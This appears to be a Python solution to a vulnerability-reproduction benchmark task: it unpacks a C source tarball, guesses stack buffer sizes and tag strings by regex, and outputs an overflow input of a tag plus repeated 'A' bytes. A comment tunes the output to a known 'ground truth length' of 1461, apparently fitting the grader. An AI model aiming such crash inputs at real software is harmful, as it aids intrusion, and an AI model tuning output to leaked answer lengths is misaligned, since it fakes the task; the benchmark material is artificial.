import os
import tarfile
import tempfile
import subprocess
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(path=tmpdir)
            
            # Find the main source file
            source_file = self._find_source_file(tmpdir)
            if not source_file:
                return self._generate_generic_poc()
            
            # Analyze buffer size and tag format
            buffer_info = self._analyze_buffer_size(source_file)
            tag_info = self._analyze_tags(source_file)
            
            if not buffer_info or not tag_info:
                return self._generate_generic_poc()
            
            # Generate optimized PoC
            return self._generate_optimized_poc(buffer_info, tag_info)
    
    def _find_source_file(self, directory):
        """Find the main C/C++ source file in the directory."""
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
                    # Prefer files with main function
                    full_path = os.path.join(root, file)
                    with open(full_path, 'r', errors='ignore') as f:
                        content = f.read()
                        if 'int main' in content or 'void main' in content:
                            return full_path
        # Return any C/C++ file if no main found
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
                    return os.path.join(root, file)
        return None
    
    def _analyze_buffer_size(self, source_file):
        """Analyze buffer declarations to find size."""
        with open(source_file, 'r', errors='ignore') as f:
            content = f.read()
            
        # Look for stack buffer declarations
        patterns = [
            r'char\s+\w+\[(\d+)\]',  # char buffer[SIZE]
            r'char\s+\w+\[\s*(\d+)\s*\]',  # char buffer[ SIZE ]
            r'char\s+\w+\[(\w+)\]',  # char buffer[SIZE_CONST]
            r'\w+\s+\w+\[(\d+)\]',  # type buffer[SIZE]
        ]
        
        max_size = 0
        for pattern in patterns:
            matches = re.finditer(pattern, content)
            for match in matches:
                try:
                    size = int(match.group(1))
                    if size > max_size and size < 10000:  # Reasonable stack size
                        max_size = size
                except ValueError:
                    # Might be a constant, look for its definition
                    const_name = match.group(1)
                    const_pattern = r'#define\s+' + re.escape(const_name) + r'\s+(\d+)'
                    const_match = re.search(const_pattern, content)
                    if const_match:
                        size = int(const_match.group(1))
                        if size > max_size and size < 10000:
                            max_size = size
        
        if max_size > 0:
            return {'buffer_size': max_size}
        return None
    
    def _analyze_tags(self, source_file):
        """Analyze tag patterns in the source code."""
        with open(source_file, 'r', errors='ignore') as f:
            content = f.read()
        
        # Look for tag-like strings (common in parsing)
        tag_patterns = [
            r'"([A-Za-z0-9_\-]{3,10})"',  # String literals
            r'\'([A-Za-z0-9_\-]{1,5})\'',  # Character sequences
            r'strcmp.*"([^"]+)"',  # String comparisons
            r'strstr.*"([^"]+)"',  # String searches
        ]
        
        tags = []
        for pattern in tag_patterns:
            matches = re.findall(pattern, content)
            for tag in matches:
                if len(tag) >= 2 and tag not in tags:
                    tags.append(tag)
        
        if tags:
            # Prefer shorter tags for efficiency
            tags.sort(key=len)
            return {'tags': tags, 'preferred_tag': tags[0]}
        return None
    
    def _generate_generic_poc(self):
        """Generate a generic PoC when analysis fails."""
        # Create a pattern that likely triggers overflow:
        # 1. A tag to activate vulnerable code path
        # 2. Large amount of data to overflow buffer
        tag = b"TAG:"
        overflow_data = b"A" * 2000  # Generous overflow
        return tag + overflow_data
    
    def _generate_optimized_poc(self, buffer_info, tag_info):
        """Generate optimized PoC based on analysis."""
        buffer_size = buffer_info.get('buffer_size', 100)
        tag = tag_info.get('preferred_tag', 'TAG').encode()
        
        # Calculate optimal overflow size
        # Need enough to overflow buffer and overwrite return address
        # Account for stack alignment, saved registers, etc.
        overflow_size = buffer_size + 100  # Conservative
        
        # Ground truth length is 1461, aim for that or smaller
        target_length = 1461
        if overflow_size + len(tag) > target_length:
            # Adjust to meet target
            overflow_size = target_length - len(tag)
        
        # Ensure minimum overflow
        min_overflow = buffer_size + 50
        if overflow_size < min_overflow:
            overflow_size = min_overflow
        
        # Generate pattern that helps identify overflow location
        # Using pattern to help with debugging if needed
        pattern = b"A" * overflow_size
        
        poc = tag + pattern
        
        # Trim to target length if needed
        if len(poc) > target_length:
            poc = poc[:target_length]
        
        return poc
